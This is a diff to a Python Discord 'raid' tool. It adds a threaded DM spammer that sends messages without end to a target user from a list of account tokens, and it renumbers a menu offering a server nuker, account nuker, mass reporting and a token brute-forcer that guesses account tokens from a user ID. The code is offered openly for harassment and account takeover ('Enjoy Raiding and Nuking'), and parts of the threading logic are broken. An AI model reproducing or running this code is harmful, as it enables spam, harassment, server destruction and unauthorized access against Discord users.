@@ -30,8 +30,6 @@ def randstr(lenn):
     return text
 
 
-
-
 def friender(token, user):
     try:
         user = user.split("#")
@@ -60,6 +58,43 @@ def friender(token, user):
         print(e)
 
 
+def DMSpammer(idd, message, token):
+        header = {
+                'Authorization': token,
+                "accept": "*/*",
+                "accept-language": "en-GB",
+                "content-length": "90",
+                "content-type": "application/json",
+                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
+                "origin": "https://discord.com",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
+                "x-debug-options": "bugReporterEnabled",
+                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
+            }
+
+        payload = {'recipient_id': idd}
+        r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
+                           json=payload)
+
+        payload = {"content": message, "tts": False}
+        j = json.loads(r1.content)
+
+        while True:
+            r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
+                               headers=header, json=payload)
+
+            if r2.status_code == 429:
+                ratelimit = json.loads(r2.content)
+                print("Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
+                time.sleep(float(ratelimit['retry_after']))
+
+            elif r2.status_code == 200:
+                print(f"[+] DM sent to {idd}!")
+
+
 def spammer():
     print("")
     print("▒█▀▀█ █░░█ █▀▀ █▀▀ █░░█ 　 ▒█░▄▀ ░▀░ █░░ █░░ █▀▀ █▀▀█")
@@ -68,12 +103,13 @@ def spammer():
 
     print("                                      Made by Lososik")
 
-    print('[1] Spammer        [7] Webhook spammer')
-    print('[2] Friend spammer [8] Nuker')
-    print('[3] Joiner         [9] Account Nuker')
-    print('[4] Leaver         [10] MassReport')
-    print('[5] Typing spammer [11] Token Bruteforce')
-    print('[6] Token checker  [12] About')
+    print('[1] Spammer        [8] Webhook spammer')
+    print('[2] DM Spammer     [9] Nuker')
+    print('[3] Friend spammer [10] Account Nuker')
+    print('[4] Joiner         [11] MassReport')
+    print('[5] Leaver         [12] Token Bruteforce')
+    print('[6] Typing spammer [13] About')
+    print('[7] Token checker  [14] Exit')
 
     choice = int(input('[?]> '))
 
@@ -120,9 +156,30 @@ def spammer():
         exit = spammer()
 
 
-
-
     if choice == 2:
+        print('''
+╭━╮╱╭━┳━╮╱╱╭┳┳╮╱╱╱╱╱╱╱╱╭━━┳━┳━╮╭━━╮
+┃╋┣┳┫━┫━╋┳╮┃╭╋╋╮╭╮╭━┳┳╮╰╮╮┃┃┃┃┃┃━━╋━┳━╮╭━━┳━━┳━┳┳╮
+┃╭┫┃┣━┣━┃┃┃┃╰┫┃╰┫╰┫┻┫╭╯╭┻╯┃┃┃┃┃┣━━┃╋┃╋╰┫┃┃┃┃┃┃┻┫╭╯
+╰╯╰━┻━┻━╋╮┃╰┻┻┻━┻━┻━┻╯╱╰━━┻┻━┻╯╰━━┫╭┻━━┻┻┻┻┻┻┻━┻╯
+╱╱╱╱╱╱╱╱╰━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯''')
+
+        tokens = open("tokens.txt", "r").read().splitlines()
+        user = input("User ID: ")
+        message = input("Message: ")
+
+        def thread():
+            for token in tokens:
+                threading.Thread(target=DMSpammer, args=(user, message, token)).start()
+
+        start = input('Press enter to start: ')
+        start = thread()
+
+        exit = input('press any key: ')
+        exit = spammer()
+
+
+    if choice == 3:
         print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═══╗──────────╔╗
 ║╔═╗║─────────────║║║╔╝║║║║──────║╔══╝──────────║║
 ║╚═╝╠╗╔╦══╦══╦╗─╔╗║╚╝╝╔╣║║║╔══╦═╗║╚══╦═╦╦══╦═╗╔═╝╠══╦═╗╔══╦══╦══╦╗╔╦╗╔╦══╦═╗
@@ -144,7 +201,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 3:
+    if choice == 4:
         print('')
         print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ░░█ █▀█ █ █▄░█ █▀▀ █▀█')
         print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄█ █▄█ █ █░▀█ ██▄ █▀▄')
@@ -202,7 +259,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 4:
+    if choice == 5:
         print('')
         print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   █░░ █▀▀ ▄▀█ █░█ █▀▀ █▀█')
         print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄▄ ██▄ █▀█ ▀▄▀ ██▄ █▀▄')
@@ -228,7 +285,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 5:
+    if choice == 6:
         print('')
         print('╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╱╱╱╱╱╱╱╭╮')
         print('┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃╱╱╱╱╱╱╭╯╰╮')
@@ -276,7 +333,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 6:
+    if choice == 7:
         print('')
         print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ▀█▀ █▀█ █▄▀ █▀▀ █▄░█   █▀▀ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█')
         print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   ░█░ █▄█ █░█ ██▄ █░▀█   █▄▄ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄')
@@ -324,7 +381,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 7:
+    if choice == 8:
         print('''
 ┏━━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋╋┏┓┏┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋┏┓╋╋╋╋╋╋╋┏┓
 ┃┏━┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋╋┃┃┃┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋┃┃╋╋╋╋╋╋╋┃┃
@@ -367,7 +424,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 8:
+    if choice == 9:
         print('')
         print('╭━━━┳╮╱╭┳━━━┳━━━┳╮╱╱╭╮╭╮╭━┳━━┳╮╱╱╭╮╱╱╭━━━┳━━━╮╭━╮╱╭┳╮╱╭┳╮╭━┳━━━┳━━━╮')
         print('┃╭━╮┃┃╱┃┃╭━╮┃╭━╮┃╰╮╭╯┃┃┃┃╭┻┫┣┫┃╱╱┃┃╱╱┃╭━━┫╭━╮┃┃┃╰╮┃┃┃╱┃┃┃┃╭┫╭━━┫╭━╮┃')
@@ -469,15 +526,25 @@ def spammer():
 
 
         def thread():
-                threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()
+                threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
+        thread()
+
+        def thread2():
+                threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()
+
+        thread2()
+
+        def thread3():
+                threading.Thread(target=Ban, args=(client.run(TOKEN))).start()
+
+        thread3()
 
 
-        client.run(TOKEN)
         exit = input('press any key: ')
         exit = spammer()
 
 
-    if choice == 9:
+    if choice == 10:
         print('''
 ╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭━╮╭╮╭╮╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╭━╮╱╭╮╱╱╭╮
 ┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃┃╭╯┃┃┃┃╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮┃┃╰╮┃┃╱╱┃┃
@@ -669,7 +736,7 @@ def spammer():
         exit = input('press any key: ')
         exit = spammer()
 
-    if choice == 10:
+    if choice == 11:
 
         print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═╗╔═╗─────────╔═══╗──────────╔╗
 ║╔═╗║─────────────║║║╔╝║║║║──────║║╚╝║║─────────║╔═╗║─────────╔╝╚╗
@@ -747,7 +814,7 @@ def spammer():
         exit = spammer()
 
 
-    if choice == 11:
+    if choice == 12:
         print('''╭━╮╱╭━┳━╮╱╱╭┳┳╮╱╱╱╱╱╱╱╱╭━━╮╭╮╱╱╱╱╱╱╭━━╮╱╱╱╭╮╱╱╭━╮
 ┃╋┣┳┫━┫━╋┳╮┃╭╋╋╮╭╮╭━┳┳╮╰╮╭┻┫┣┳━┳━┳╮┃╭╮┣┳┳┳┫╰┳━┫━╋━┳┳┳━┳━┳┳╮
 ┃╭┫┃┣━┣━┃┃┃┃╰┫┃╰┫╰┫┻┫╭╯╱┃┃╋┃━┫┻┫┃┃┃┃╭╮┃╭┫┃┃╭┫┻┫╭┫╋┃╭┫━┫┻┫╭╯
@@ -759,13 +826,16 @@ Do not do this without the permission of the person to whom the bruteforce attac
         id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
         id_to_token = str(id_to_token)[2:-1]
 
+
         def bruteforece():
             while id_to_token == id_to_token:
                 token = id_to_token + '.' + ('').join(
                     random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                             '').join(random.choices(string.ascii_letters + string.digits, k=25))
 
+
                 headers = {'Authorization': token}
+
 
                 login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                 try:
@@ -778,17 +848,20 @@ Do not do this without the permission of the person to whom the bruteforce attac
                 finally:
                     print('')
 
+
         def thread():
             while True:
                 threading.Thread(target=bruteforece).start()
 
+
         thread()
+
 
         exit = input('press any key: ')
         exit = spammer()
 
 
-    if choice == 12:
+    if choice == 13:
         print('''Wassup buddy. This is fun made tool by Lososik...      
 If you have got some problems join https://dsc.gg/deadd or contact Lososik#0954.
 Enjoy Raiding and Nuking :D
@@ -796,7 +869,12 @@ Special thanks to H0LLOW for helping me with a few things.
 ''')
 
 
-    exit = input('press any key: ')
-    exit = spammer()
+        exit = input('press any key: ')
+        exit = spammer()
+
+
+    if choice == 14:
+        quit('')
+
 
 spammer()
